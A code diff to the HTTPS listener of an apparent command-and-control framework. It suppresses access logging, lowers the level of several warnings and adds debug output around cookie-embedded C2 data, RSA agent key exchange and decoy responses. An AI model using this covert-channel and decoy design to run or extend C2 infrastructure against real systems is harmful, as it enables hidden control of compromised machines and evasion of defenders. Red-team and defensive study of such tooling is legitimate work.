@@ -87,7 +87,7 @@ class HttpsListener(BaseListener):
         # header limit, so we raise it to 1MB.
         self._runner = web.AppRunner(
             self._app,
-            access_log=logging.getLogger("caraxes.access"),
+            access_log=None,  # Suppress per-request access log; use --debug for diagnostics
             max_field_size=1024 * 1024,
         )
         await self._runner.setup()
@@ -155,13 +155,14 @@ class HttpsListener(BaseListener):
                 log.debug(f"[request] no C2 data extracted (raw={len(raw_data) if raw_data else 0} bytes)")
                 return await self._handle_decoy(request)
 
-            log.debug(f"[request] extracted {len(raw_data)} bytes of C2 data")
+            log.debug(f"[request] extracted {len(raw_data)} bytes of C2 data, "
+                      f"hex[0:16]={raw_data[:16].hex()}")
 
             # Parse outer packet header
             magic, size, msg_id = unpack_packet_header(raw_data)
             log.debug(f"[request] packet: magic=0x{magic:08X} size={size} msg_id={msg_id}")
             if magic != self.magic:
-                log.warning(f"[request] magic mismatch: got 0x{magic:08X}, expected 0x{self.magic:08X}")
+                log.debug(f"[request] magic mismatch: got 0x{magic:08X}, expected 0x{self.magic:08X}")
                 return await self._handle_decoy(request)
 
             encrypted_payload = raw_data[HEADER_SIZE:size]
@@ -175,15 +176,14 @@ class HttpsListener(BaseListener):
             agent_id, plaintext = self._decrypt_and_identify(encrypted_payload)
 
             if plaintext is None:
-                rsa_size_note = ""
                 if self._rsa_private_key and len(encrypted_payload) != 256:
-                    rsa_size_note = (f" — RSA-2048 expects 256 bytes but got {len(encrypted_payload)}, "
-                                    f"raw_data={len(raw_data)} size_field={size}")
-                log.warning(f"[request] decryption failed — could not identify agent "
-                           f"(payload {len(encrypted_payload)} bytes, "
-                           f"sessions={len(list(self.session_manager.all_sessions()))}, "
-                           f"rsa_key={'yes' if self._rsa_private_key else 'NO'}"
-                           f"{rsa_size_note})")
+                    log.warning(f"[!] Key exchange: expected 256-byte RSA ciphertext, "
+                                f"got {len(encrypted_payload)} (packet {len(raw_data)} bytes). "
+                                f"Check agent was built with current keys/server_pub.pem")
+                log.debug(f"[request] decryption failed — could not identify agent "
+                          f"(payload {len(encrypted_payload)} bytes, "
+                          f"sessions={len(list(self.session_manager.all_sessions()))}, "
+                          f"rsa_key={'yes' if self._rsa_private_key else 'NO'})")
                 return await self._handle_decoy(request)
 
             log.info(f"[request] identified agent {agent_id[:8]}, plaintext {len(plaintext)} bytes")
@@ -241,7 +241,8 @@ class HttpsListener(BaseListener):
             if end == -1:
                 end = len(raw_cookie)
             cookie_val = raw_cookie[start:end].strip()
-            log.debug(f"[extract] raw cookie value len={len(cookie_val)}")
+            log.debug(f"[extract] raw cookie value len={len(cookie_val)} "
+                      f"first40={cookie_val[:40]!r} last20={cookie_val[-20:]!r}")
             if not cookie_val:
                 return None
             return self.profile.decode_data(cookie_val, emb)
